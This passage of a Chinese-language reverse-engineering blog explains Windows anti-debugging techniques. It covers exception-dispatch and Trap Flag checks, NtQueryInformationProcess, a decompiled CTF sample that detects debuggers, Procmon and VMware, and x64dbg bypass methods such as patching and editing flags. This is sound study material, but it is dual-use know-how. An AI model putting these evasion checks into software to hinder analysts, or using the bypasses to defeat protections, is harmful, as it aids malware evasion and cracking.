class="keyword">if</span> (g_flag == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No debugger detected (VEH ran).\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Debugger likely present (VEH not executed as expected).\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cleanup</span></span><br><span class="line">    RemoveVectoredExceptionHandler(h);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>流程：</p><ol><li>异常发生 → 内核产生异常记录。</li><li>如果有调试器 attached，内核会向调试器发送 <strong>first-chance</strong> 通知。</li><li>调试器可以在 first-chance 阶段中：<ul><li>停住程序供用户查看（默认行为），导致程序暂停；或直接处理并让程序继续（模拟处理），这可能阻止用户注册的 VEH&#x2F;SEH 执行，或改变异常分派路径。</li></ul></li><li>如果调试器处理并继续，程序的 handler 就可能 <strong>永远不被调用</strong>（或被修改后的上下文执行），程序据此推断“被调试”。</li></ol><p>注意：不同调试器&#x2F;设置对 first-chance 的行为可配置（x64dbg&#x2F;Olly&#x2F;WinDbg 可以选择是否在特定异常上停止），因此这种检测不是 100% 稳妥，但在默认设置下通常有效。</p><blockquote><p><strong>使用内核调试 &#x2F; 更高级的调试器</strong>有些反调试技术试图作出区别，使用 KD（内核调试）通常更难被用户模式反调试检测到。</p></blockquote><p><strong>如果没有调试器 attached</strong>：内核不会把异常先发给调试器，异常会直接按进程内的异常分派流程走 —— 先调用 <strong>VEH</strong>（vectored handlers），然后是 <strong>SEH</strong>（structured handlers），最后才是未处理异常（可能触发默认终止&#x2F;UnhandledExceptionFilter）。</p><p><strong>有调试器 attached 时</strong>：内核会把异常先以 <em>first-chance</em> 事件发给调试器。调试器在接到这个事件后可以选择“告诉内核：我已处理（DBG_CONTINUE）”或“我没处理（DBG_EXCEPTION_NOT_HANDLED）”。如果调试器告诉内核“已处理”，那么内核就不会继续把异常分派给进程的 VEH&#x2F;SEH —— 因而进程注册的 handler 可能<strong>不会被调用</strong>。这就是为什么调试器的存在会改变异常分派路径。</p><p>举个常见场景：程序在某处 <code>RaiseException(0xDEADBEEF)</code>，并寄望自己的 VEH 在该异常发生时被执行来设置某个标志 <code>g_flag = 1</code>。这本来在“无调试器”时会发生。</p><ul><li><strong>无调试器</strong>：异常直接被内核派送 → VEH 执行 → <code>g_flag</code> 被置 1 → 程序继续，判断无调试器。</li><li><strong>有调试器，且调试器在 first-chance 阶段选择“已处理”或用户按了“继续（并让调试器返回 DBG_CONTINUE）”</strong>：内核把异常视为已处理 → <strong>不再调用进程的 VEH</strong> → <code>g_flag</code> 保持 0 → 程序判断“被调试”。</li></ul><p>线程触发异常（<code>RaiseException</code>、非法内存访问、<code>INT3</code>、单步等）。</p><p>CPU&#x2F;内核产生异常记录并开始异常分派流程。</p><p><strong>内核先检查该进程是否被调试（有调试器 attached）</strong>。</p><ul><li>如果没有调试器，内核直接把异常按进程内的顺序派发给 VEH → SEH → UnhandledFilter。</li><li>如果有调试器，内核会先把一个 <em>DebugEvent</em>（first-chance exception）发给调试器（例如 x64dbg）。</li></ul><p>调试器收到这个 first-chance 事件后，<strong>通过 <code>ContinueDebugEvent</code> 返回一个状态</strong>给内核（<code>DBG_CONTINUE</code> 或 <code>DBG_EXCEPTION_NOT_HANDLED</code>）。</p><ul><li><code>DBG_EXCEPTION_NOT_HANDLED</code> → 内核继续把异常派给进程的 VEH&#x2F;SEH（让程序自身处理）。</li><li><code>DBG_CONTINUE</code> → 内核认为异常已被处理，不再把异常派给进程的用户态 handler（因此 VEH&#x2F;SEH 可能不会被调用）。</li></ul><blockquote><p>既然如此，为什么程序不直接查内核来探知调试器呢?</p></blockquote><p>在 Windows 下，每个被调试的进程，内核都会维护一些标志与结构：</p><ul><li>在 <strong>EPROCESS</strong> 结构中：<ul><li>有个成员叫 <code>DebugPort</code>，指向一个 <code>_DEBUG_OBJECT</code>；</li><li>还有 <code>DebugFlags</code> 等字段；</li><li>只要这个指针非空，就表示该进程正在被调试。</li></ul></li><li>同时，线程 (<code>ETHREAD</code>) 结构中也可能会保存调试事件的上下文。</li></ul><p>因此，<strong>内核态确实完全知道调试器是谁、什么时候附加、附加到哪个进程</strong>。</p><p>但这些信息<strong>不暴露给用户态</strong></p><p>用户态程序无法直接读取这些内核结构，原因有三：</p><p><strong>保护边界（Ring3 vs Ring0）</strong></p><ul><li><code>EPROCESS</code>, <code>ETHREAD</code>, <code>_DEBUG_OBJECT</code> 都在 Ring0（内核态）。</li><li>用户态（Ring3）程序没有权限直接访问内核虚拟地址空间。</li><li>即使知道符号（<code>EPROCESS</code> 在 ntoskrnl.exe 中），也无法直接 <code>mov</code> 读取它。</li></ul><p><strong>API 层被“裁剪”了</strong></p><p>Windows 提供的用户态 API，比如 <code>IsDebuggerPresent</code>, <code>CheckRemoteDebuggerPresent</code>, <code>NtQueryInformationProcess</code> 等，其实都是“内核信息的受限投影”。</p><p>它们内部通过 <code>NtQueryInformationProcess</code> (info class &#x3D; <code>ProcessDebugPort</code>, <code>ProcessDebugFlags</code>, <code>ProcessDebugObjectHandle</code> 等) 向内核询问部分信息。</p><p>但这些接口<strong>是受控的</strong> —— 内核返回的内容经过过滤（不能读内核地址，只能拿到 0 或句柄）。</p><p><strong>安全与稳定性考虑</strong></p><ul><li>如果任何进程都能直接查询“系统内核结构”来判断调试器存在，会破坏用户态和内核态的隔离。</li><li>Windows 的调试系统是由 <strong>调试端口机制（Debug Port &#x2F; Debug Object）</strong> 实现的，受对象句柄表管理。</li><li>内核保证只有通过 <code>NtDebugActiveProcess</code> 等系统调用（必须有合适权限）才能建立这种关系。</li></ul><p>绕过方法：</p><p><strong>方法 A — 改变 x64dbg 的异常处理策略</strong></p><p>目的：让调试器<strong>不在 first-chance 阶段处理&#x2F;截断</strong>那类异常，直接让进程的 VEH&#x2F;SEH 运行。</p><p>步骤（通用，x64dbg UI 名称略有不同，但在菜单里都能找到）：</p><ol><li>在 x64dbg 菜单里打开 <strong>Debug -&gt; Exceptions</strong>（或在 Options&#x2F;Preferences 下找 Debugging → Exceptions）。</li><li>在异常列表中查找你关心的异常码：<ul><li>常见的软件异常（<code>RaiseException(0xDEADBEEF)</code>）用自定义异常码（例如 <code>0xDEADBEEF</code>），</li><li>硬件&#x2F;系统异常有 <code>STATUS_ACCESS_VIOLATION (0xC0000005)</code>、<code>STATUS_BREAKPOINT (0x80000003)</code>、<code>STATUS_SINGLE_STEP (0x80000004)</code> 等。</li></ul></li><li>把这些异常的 <strong>“First chance”</strong> 行为改为 <strong>“Pass to program &#x2F; Not handled &#x2F; Don’t break on first-chance”</strong>（x64dbg 中叫法可能是取消勾选“Break on first-chance”或将动作设为 <code>Ignore</code> &#x2F; <code>Pass</code>）。</li><li>重新运行程序（或重新附加）。这时当异常发生，x64dbg 不会拦截为 first-chance，而会让内核把异常交给进程（VEH&#x2F;SEH）——你的 handler 就会执行，反调试检测失败或被绕过。</li></ol><p>验证：在程序触发异常的点，x64dbg 不再弹出 first-chance 对话，程序按原设计继续，或 VEH 中的标志被置位。</p><p><strong>方法 B — 在 handler 上下下断点 &#x2F; 跟踪 VEH 注册</strong></p><p>目的：直接观察并控制异常处理流程——如果 handler 本身在做重要解密&#x2F;检测，可以在 handler 入口断点并修改内存&#x2F;寄存器以“欺骗”检测。</p><p>步骤：</p><ol><li>运行一次程序（或静态用 IDA&#x2F;Ghidra）找出 <code>RtlAddVectoredExceptionHandler</code> &#x2F; <code>AddVectoredExceptionHandler</code> 的调用位置，或在运行时为这些 API 下断点（在 x64dbg：右键模块导出 -&gt; 在目标 API 上下断点）。</li><li>当执行到注册 handler 的地方时，记录 handler 地址（通常会以函数指针形式传给 API）。</li><li>在 handler 地址处下断点。下一次异常发生时调试器会在 handler 处停住，你可以：<ul><li>单步查看 handler 是否执行；</li><li>直接在内存&#x2F;寄存器里把被检测标志（比如 <code>g_flag</code>）设为期望值，继续执行；</li><li>或修改 handler 的第一条指令为 <code>ret</code> &#x2F; NOP 等跳过检测逻辑。</li></ul></li></ol><p><strong>方法 C — 直接 patch 二进制（静态修改）</strong></p><p>目的：彻底去掉检测调用（例如把 <code>RaiseException</code> 替换为 NOP），适合离线分析或需要重复运行的场景。</p><p>步骤：</p><ol><li>在 IDA&#x2F;x64dbg 找到 <code>RaiseException</code> &#x2F; <code>int 3</code> &#x2F; 触发异常的指令地址。</li><li>在 x64dbg 的反汇编视图用 <strong>Assemble &#x2F; Patch</strong> 功能把调用替成 NOPs（或把 <code>call RaiseException</code> 改为 <code>xor ecx,ecx</code> &#x2F; <code>mov reg,0</code> 等）或直接跳过分支。</li><li>保存修改（x64dbg 支持 patch 并导出 patched file）。重新运行 patched 文件以验证绕过成功。</li></ol><p><strong>方法 D — 在异常发生点“跳过”到下一指令</strong></p><p>用途：调试时临时跳过异常点而不修改文件。</p><p>步骤：</p><ol><li>当异常刚被触发并且 x64dbg暂停（或在断点处），在反汇编窗口定位到异常指令的下一个有效指令地址。</li><li>使用 x64dbg 的“Set Next Instruction” &#x2F; 修改 RIP&#x2F;EIP 寄存器直接把指令指针改到下一条指令（这相当于跳过异常触发指令）。</li><li>继续运行。</li></ol><p><strong>方法 E — 写入内存“伪造”处理结果（最直接）</strong></p><p>如果检测只是检查一个内存标志 <code>g_flag</code>，可以在异常发生前&#x2F;中&#x2F;后直接把该变量写成期望值（使用 x64dbg 的 Dump&#x2F;Memory 编辑或 Debug -&gt; Memory）：</p><ol><li>找到 <code>g_flag</code> 在内存中的地址（通过符号、字符串引用或观察堆栈&#x2F;全局数据）。</li><li>在异常发生前写 <code>1</code> 到该地址，程序看到已被置位就会认为没有调试器。</li></ol><p><strong>方法 F — 更高级：隐藏调试器 &#x2F; 使用内核调试</strong></p><ul><li>插件方式（例如 ScyllaHide、HideDebugger）可以在某些样本上生效，但它们本身也可能被样本检测到或被 AV 标记。</li><li>使用 <strong>内核调试（KD）</strong> 或 <strong>WinDbg &#x2F; KD over network</strong> 可避免用户态调试器引起的某些 first-chance 差异（更难被反调试检测到），但操作复杂。</li></ul><h2 id="单步检测反调试"><a href="#单步检测反调试" class="headerlink" title="单步检测反调试"></a>单步检测反调试</h2><p>单步检测反调试是一种通过检测CPU的<strong>单步执行（Trap Flag, TF）</strong>来判断是否有调试器介入的技术。当调试器单步执行目标程序时，CPU的<code>TF</code>标志会被设置为1，这会导致在每条指令执行完后触发一个调试中断。因此，程序可以通过监控<code>TF</code>标志的变化来检测调试行为。</p><p><strong>Trap Flag（TF）</strong>：当<code>EFLAGS</code>寄存器中的<code>TF</code>标志被置为1时，CPU会进入单步模式，每执行一条指令后都会产生一个调试中断（<code>INT 1</code>）。通过检查和控制<code>TF</code>标志，可以判断程序是否被调试器单步执行。如果调试器处于单步调试模式，<code>TF</code>标志会被置1，程序可以利用这一特性检测调试行为。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 保存原来的EFLAGS寄存器值</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> eflags;</span><br><span class="line"></span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushfd                   <span class="comment">// 将EFLAGS压入栈中</span></span><br><span class="line">        pop eax                  <span class="comment">// 将栈顶的EFLAGS值弹出到EAX寄存器</span></span><br><span class="line">        mov eflags, eax          <span class="comment">// 保存EFLAGS寄存器到eflags变量</span></span><br><span class="line">        or eax, <span class="number">0x100</span>            <span class="comment">// 设置TF（Trap Flag）位为1，启用单步调试模式</span></span><br><span class="line">        push eax                 <span class="comment">// 将修改后的EFLAGS值压回栈</span></span><br><span class="line">        popfd                    <span class="comment">// 恢复EFLAGS寄存器，使Trap Flag生效</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行单步调试后检测</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        nop                      <span class="comment">// 一个空操作，用于单步执行检测</span></span><br><span class="line">        pushfd                   <span class="comment">// 将当前的EFLAGS寄存器值压入栈</span></span><br><span class="line">        pop eax                  <span class="comment">// 弹出EFLAGS到EAX</span></span><br><span class="line">        mov eflags, eax          <span class="comment">// 保存当前的EFLAGS值</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测Trap Flag是否被清除（如果有调试器在调试，该标志可能被复位）</span></span><br><span class="line">    <span class="keyword">if</span> (eflags &amp; <span class="number">0x100</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;No debugger detected (TF still set).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Debugger detected (TF cleared).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        ExitProcess(<span class="number">0</span>);           <span class="comment">// 检测到调试器，退出程序</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Program continues running...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果程序在执行<code>nop</code>指令后，<code>TF</code>标志依然保持为1，则说明程序未被调试，输出“**No debugger detected (TF still set)<strong>”。如果程序发现<code>TF</code>标志被清除（调试器可能重置了该标志），则输出“</strong>Debugger detected (TF cleared)**”，并终止程序执行。</p><h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><p><strong>KUSER_SHARD_DATA</strong></p><p>用户空间和内核空间有一块共享空间<code>KUSER_SHARD_DATA</code>，可以通过检查其中的内核调试检查位<code>KdDebuggerEnabled</code>来获取内核调试状态</p><p><a href="https://learn.microsoft.com/zh-CN/windows-hardware/drivers/ddi/ntddk/ns-ntddk-kuser_shared_data">KUSER_SHARED_DATA (ntddk.h) - Windows drivers | Microsoft Learn</a></p><p><strong>SeDebugPrivileges</strong></p><p>一般进程是默认禁用SeDebugPrivilege权限的，但是调试器会开启此权限，通过调试器开启的进程也会获得该权限，通过检查进程是否启用SeDebugPrivilege权限可以间接检测调试器</p><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--">在 C++ 中启用和禁用特权 - Win32 apps | Microsoft Learn</a></p><p><strong>Job Object</strong></p><p>为了共享权限，调试器和被调试进程会放在同一job object中，通过检查进程同一object中的所有进程，可以枚举出调试器</p><p><strong>Heap Flags</strong></p><p><a href="https://ctf-wiki.org/reverse/platform/windows/anti-debug/heap-flags/">Heap Flags - CTF Wiki (ctf-wiki.org)</a></p><p>HeapFlag：大于2说明正在被调试</p><p>HeapForceFlag：大于0说明正在被调试</p><p><strong>NtYeildExecution</strong></p><p>这个函数可以让任何就绪的线程暂停执行，等待下一个线程调度。</p><p>当前线程放弃剩余时间，让给其他线程执行。如果没有其他准备好的线程，该函数返回false，否则返回true。</p><p>当前线程如果被调试，那么调试器线程若处于单步状态，随时等待继续运行，则被调试线程执行NtYieldExecution时，调试器线程会恢复执行。</p><p>此时NtYieldExecution返回true，该线程则认为自身被调试了</p><p><strong>ZwSetInformationThread</strong></p><p>将第二个参数设为0x11，可以将进程隐藏</p><p><a href="https://ctf-wiki.org/reverse/platform/windows/anti-debug/zwsetinformationthread/">ZwSetInformationThread - CTF Wiki (ctf-wiki.org)</a></p><p><strong>LFH低碎片堆</strong></p><p>堆碎片是一种状态，其中可用内存被分解为较小的非连续块。 当堆被碎片化时，即使堆中的可用内存总量足以满足请求，内存分配也可能会失败，因为没有一个内存块足够大。 低碎片堆 (LFH) 有助于减少堆碎片</p><p>调试工具无法启用LFH，会导致空间开辟错误，因此可以判断是否正在调试</p><p>例题：<a href="https://ctf-wiki.org/reverse/platform/windows/anti-debug/example/#isdebuggerpresent">反调试技术例题 - CTF Wiki</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v24, <span class="number">0</span>, <span class="number">0x3Fu</span>);</span><br><span class="line">  v22 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input password &gt;&quot;</span>);</span><br><span class="line">  v3 = (FILE *)sub_40223D();</span><br><span class="line">  fgets(&amp;v23, <span class="number">64</span>, v3);</span><br><span class="line">  <span class="built_in">strcpy</span>(v21, <span class="string">&quot;I have a pen.&quot;</span>);</span><br><span class="line">  v22 = <span class="built_in">strncmp</span>(&amp;v23, v21, <span class="number">0xDu</span>); <span class="comment">// 1. 直接比较明文字符串与输入字符串</span></span><br><span class="line">  <span class="keyword">if</span> ( !v22 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your password is correct.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( IsDebuggerPresent() == <span class="number">1</span> )     <span class="comment">// 2. API: IsDebuggerPresent()</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;But detected debugger!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( sub_401120() == <span class="number">0x70</span> )         <span class="comment">// 3. 检测PEB的0x68偏移处是否为0x70. 检测NtGlobalFlag()</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;But detected NtGlobalFlag!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  BOOL WINAPI CheckRemoteDebuggerPresent(</span></span><br><span class="line"><span class="comment">     *    _In_    HANDLE hProcess,</span></span><br><span class="line"><span class="comment">     *    _Inout_ PBOOL  pbDebuggerPresent</span></span><br><span class="line"><span class="comment">     *  );</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    v4 = GetCurrentProcess();</span><br><span class="line">    CheckRemoteDebuggerPresent(v4, &amp;pbDebuggerPresent);</span><br><span class="line">    <span class="keyword">if</span> ( pbDebuggerPresent )            <span class="comment">// 4. API: CheckRemoteDebuggerPresent()</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;But detected remotedebug.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = GetTickCount();</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i == <span class="number">100</span>; ++i )</span><br><span class="line">      Sleep(<span class="number">1u</span>);</span><br><span class="line">    v16 = <span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">if</span> ( GetTickCount() - v13 &gt; <span class="number">1000</span> )  <span class="comment">// 5. 检测时间差</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;But detected debug.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    lpFileName = <span class="string">&quot;\\\\.\\Global\\ProcmonDebugLogger&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( CreateFileA(<span class="string">&quot;\\\\.\\Global\\ProcmonDebugLogger&quot;</span>, <span class="number">0x80000000</span>, <span class="number">7u</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0x80u</span>, <span class="number">0</span>) != (HANDLE)<span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;But detect %s.\n&quot;</span>, &amp;lpFileName);      <span class="comment">// 6. 检测ProcessMonitor</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v11 = sub_401130();     <span class="comment">// 7. API: CreateToolhelp32Snapshot()检测进程</span></span><br><span class="line">    <span class="keyword">if</span> ( v11 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;But detected Ollydbg.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v11 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;But detected ImmunityDebugger.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v11 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;But detected IDA.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v11 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;But detected WireShark.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( sub_401240() == <span class="number">1</span> )    <span class="comment">// 8. 通过vmware的I/O端口进行检测</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;But detected VMware.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = <span class="number">1</span>;</span><br><span class="line">    v20 = <span class="number">1</span>;</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">    v19 = <span class="number">1</span> / <span class="number">0</span>;</span><br><span class="line">    ms_exc.registration.TryLevel = <span class="number">-2</span>;  <span class="comment">// 9. SEH</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;But detected Debugged.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;password is wrong.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关闭<strong>ALSR</strong>有助于更方便的分析程序</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/%E5%85%B3%E9%97%ADASLR.gif" alt="关闭ASLR"></p><h2 id="NtQueryInformationProcess"><a href="#NtQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess"></a>NtQueryInformationProcess</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS WINAPI <span class="title function_">NtQueryInformationProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">  _In_      HANDLE           ProcessHandle,</span></span><br><span class="line"><span class="params">  _In_      PROCESSINFOCLASS ProcessInformationClass,</span></span><br><span class="line"><span class="params">  _Out_     PVOID            ProcessInformation,</span></span><br><span class="line"><span class="params">  _In_      ULONG            ProcessInformationLength,</span></span><br><span class="line"><span class="params">  _Out_opt_ PULONG           ReturnLength</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>通过NtQueryInformationProcess查询用户态调试器的存在</p><p><strong>ProcessDebugPort</strong></p><p>未公开的<code>ntdll</code>的<code>NtQueryInformationProcess()</code>函数接受一个信息类的参数用于查询. <code>ProcessDebugPort(7)</code>是其中的一个信息类. <code>kernel32</code>的<code>CheckRemoteDebuggerPresent()</code>函数内部通过调用<code>NtQueryInformationProcess()</code>来检测调试, 而<code>NtQueryInformationProcess</code>内部则是查询<code>EPROCESS</code>结构体的<code>DebugPort</code>字段, 当进程正在被调试时, 返回值为<code>0xffffffff</code>.</p><p><strong>由于信息传自内核, 所以在用户模式下的代码没有轻松的方法阻止该函数检测调试器.</strong></p><p><strong>ProcessDebugObjectHandle</strong></p><p>Windows XP 引入了<code>debug对象</code>, 当一个调试会话启动, 会同时创建一个<code>debug</code>对象以及与之关联的句柄. 我们可以使用<code>ProcessDebugObjectHandle (0x1e)</code>类来查询这个句柄的值</p><p><strong>ProcessDebugFlags</strong></p><p><code>ProcessDebugFlags (0x1f)</code>类返回<code>EPROCESS</code>结构体的<code>NoDebugInherit</code>的相反数. 意思是, 当调试器存在时, 返回值为<code>0</code>, 不存在时则返回<code>1</code>.</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251007150621437.png" alt="image-20251007150621437"></p><p><a href="https://blog.csdn.net/weixin_53109623/article/details/149502047">软件反调试（6）- 基于NtQueryInformationProcess的检测-CSDN博客</a></p><p>可以把7改成0</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251007150824545.png" alt="image-20251007150824545"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">xor ebp, ebp</span><br><span class="line">enter 20h, 0</span><br><span class="line">push 8 ;ProcessInformationLength</span><br><span class="line">pop r9</span><br><span class="line">push rbp</span><br><span class="line">pop r8</span><br><span class="line">push 7 ;ProcessDebugPort</span><br><span class="line">pop rdx</span><br><span class="line">or rcx, -1 ;GetCurrentProcess()</span><br><span class="line">call NtQueryInformationProcess</span><br><span class="line">leave</span><br><span class="line">test ebp, ebp</span><br><span class="line">jne 